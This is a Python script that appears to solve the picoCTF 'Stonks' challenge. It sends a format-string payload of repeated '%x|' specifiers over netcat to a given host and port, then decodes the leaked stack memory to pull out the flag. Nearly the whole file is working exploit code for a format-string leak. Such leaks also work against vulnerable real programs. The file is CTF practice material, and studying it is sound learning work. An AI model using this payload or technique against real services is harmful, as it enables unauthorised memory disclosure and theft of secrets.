#!/usr/bin/env python

import sys
import re
import subprocess

from termcolor import colored


class Stonks:
    STACK_LEAK_SIZE = 30

    def __init__(self) -> None:
        """Initialize the class."""
        try:
            self.host = str(sys.argv[1])
            self.port = int(sys.argv[2])
        except (ValueError, IndexError):
            sys.stderr.write(colored("\nInvalid host or port.\n", 'red', attrs=['bold', 'blink']))
            exit(1)

    def flag(self) -> None:
        """Get the flag."""

        data = self.nc()

        memory = self.parse(data)

        decoded = self.decode(memory)

        flag = self.exctract_flag(decoded)

        print(colored("\nFlag:", 'blue', attrs=['bold']))
        print(colored(flag, attrs=['bold', 'blink']))

    def nc(self) -> bytes:
        """Use netcat to connect to the server, and send the exploit."""

        inp = "{}\n{}\n".format(1, ("%x|" * self.STACK_LEAK_SIZE)[:-1])

        print(f"\n{colored(f'nc {self.host} {self.port}', 'yellow', attrs=['bold'])}...\n{colored(inp, 'green')}")

        data = subprocess.run(
            ["nc", str(self.host), str(self.port)],
            input=inp.encode(),
            capture_output=True
        ).stdout

        print(data.decode())

        return data

    def parse(self, data: bytes) -> bytes:
        """Parse the leaked stack memory."""

        print(colored("\nParsing leaked stack memory...", 'blue', attrs=['bold']))

        memory = re.search(b"((?<=\n)([0-9a-fA-Z]\|?)+(?=\n))", data).group(1)

        print(memory)

        return memory

    def decode(self, memory) -> bytes:
        """Decode the bytes."""

        print(colored("\nDecoding memory bytes...", 'blue', attrs=['bold']))

        decoded = b''.join(map(Stonks.decode_hex, (b for b in memory.split(b'|'))))

        print(decoded)

        return decoded

    def decode_hex(hex: bytes) -> bytes:
        try:
            return bytes.fromhex(hex.decode())[::-1]
        except ValueError:
            return hex

    def exctract_flag(self, decoded: bytes) -> str:
        """Extract the flag."""
        print(colored("\nExtracting flag bytes...", 'blue', attrs=['bold']))

        flag = re.search(b"(picoCTF{\w*})", decoded).group(1)

        print(flag)

        return flag.decode()


def main():
    Stonks().flag()


if __name__ == '__main__':
    main()
